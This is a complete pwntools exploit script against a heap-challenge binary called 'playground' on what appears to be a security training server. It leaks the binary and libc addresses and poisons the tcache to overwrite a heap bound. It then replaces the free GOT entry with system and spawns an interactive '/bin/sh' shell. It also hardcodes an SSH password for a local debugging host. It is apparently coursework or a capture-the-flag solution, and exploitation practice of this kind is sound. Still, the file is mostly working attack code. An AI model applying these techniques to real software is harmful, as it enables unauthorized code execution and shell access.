from pwn import *

exe = ELF("./playground_patched")
libc = ELF("./libc-2.27.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        host = "acidburn"
        ip = "127.0.0.1"

        category = "heap"
        proc = "playground"
        path = "/challenges/"+category+"/"+proc+"/"
        #prt = int(input(" insert "+host+"'s port to connect to:"))
        prt=3022
        #pwd = getpass("insert "+host+"'s password:")
        pwd="0607991337"
        process = "."+path+proc#+"_patched"
        print("Connecting to "+host+" at "+ip+" to execute syscall")
        ssh_p = ssh(host,ip,password=pwd,port= prt)
        gdbc = '''
                    set environment LD_PRELOAD ./libc-2.27.so
                    start
                    brva 0x11da
                    brva 0x127b
                    brva 0x1349
                    brva 0x139d
                    brva 0x13db
                    brva 0x14a1
                    c
                    c
                    c
               '''
        if ( sys.argv[1] == 'gdb') :
            r = gdb.debug( [process], ssh = ssh_p, gdbscript = gdbc )
        else:
            r = process([exe.path])
    else:
        r = remote("bin.training.jinblack.it",4010)#insert here
    return r
def free(r,addr):
    r.recvuntil(b"> ")
    command = "free "+hex(addr)
    r.sendline(command.encode())
    log.info(f"freed {hex(addr)}")
    return
def malloc(r,size):
    r.recvuntil(b"> ")
    command = "malloc " + str(size)
    r.sendline(command.encode())
    r.recvuntil(b"==>")
    addr = r.recvuntil(b"\n")[:-1]
    addr = int(addr,16)
    log.info(f"malloc {hex(addr)} size {size}")
    return addr
def show(r,addr):
    r.recvuntil(b"> ")
    command = "show " + hex(addr) + " 1"
    r.sendline(command.encode())
    r.recvuntil(b":")
    r.recvuntil(b"0x")
    leak = b"0x" + r.recvuntil(b"\n")[:-1]
    leak = int(leak,16)
    return leak
def write(r, addr, payload):
    r.recvuntil(b"> ")
    command = f"write {hex(addr)} {len(payload)}"
    r.sendline(command.encode())
    r.recvuntil(b"read\n")
    log.info(f"I have wrote {payload} at {hex(addr)}")
    r.send(payload)
    return

def main():
    r = conn()

    ##### BIN LEAK #####
    r.recvuntil(b"main: ")
    main_addr = int(r.recvuntil(b"\n")[:-1],16)
    binary_base = main_addr - exe.symbols["main"]
    exe.address = binary_base
    log.info(f"Binary base:{hex(exe.address)}")

    ##### Libc LEAK #####
    ##v1
    addr_big = malloc(r,10000)
    addr_small = malloc(r,128)
    free(r,addr_big)
    leak = show(r,addr_big)#main_arena+96
    libc.address = leak -96 -libc.symbols["main_arena"]
    ##v2
    #addrs = []
    #for _ in range(9):
    #    addrs.append(malloc(r,128))
    #for i in range(8):
    #    free(r,addrs[i])
    #leak = show(r,addrs[-2])#main_arena+96
    #libc.address = leak -96 - libc.symbols["main_arena"]
    ##v3
    #leak = show(r,exe.symbols["got.malloc"])#malloc_address, show doesn't give you any bounds !!
    #libc.address = leak - libc.symbols["malloc"]#here you simply rebase from the leak - offset
    log.info(f"Libc_base: {hex(libc.address)}")

    ##### USEFUL ADDRESSES ######
    max_heap = exe.symbols["max_heap"]
    min_heap = exe.symbols["min_heap"]
    free_hook = libc.symbols["__malloc_hook"]
    system = libc.symbols["system"]-1152
    log.info(f"Max heap : {hex(max_heap)}")
    log.info(f"min heap : {hex(min_heap)}")
    log.info(f"free hook : {hex(free_hook)}")#
    log.info(f"system : {hex(system)}")#

    ##### T-CACHE POISONING #####
    addr = malloc(r,128)
    free(r,addr)
    write(r,addr,p64(min_heap-8))#over write min_heap with 0
    malloc(r,128)#gives back addr
    malloc(r,128)#gives back min_heap- 8
    #### end

    ##What if I had a FULL RELRO library ?
     ####v1
    write(r,exe.symbols["got.free"],p64(system))
    ####v2
    #write(r,max_heap,b"\xff"*8)
    #write(r,free_hook,p64(system))

    write(r,addr,b"/bin/sh\x00")
    write(r,max_heap,b"\x00"*8)

    #free(r,addr)
    #show(r,libc.symbols["__free_hook"])
    print("din don dan")
    r.interactive()

if __name__ == "__main__":
    main()
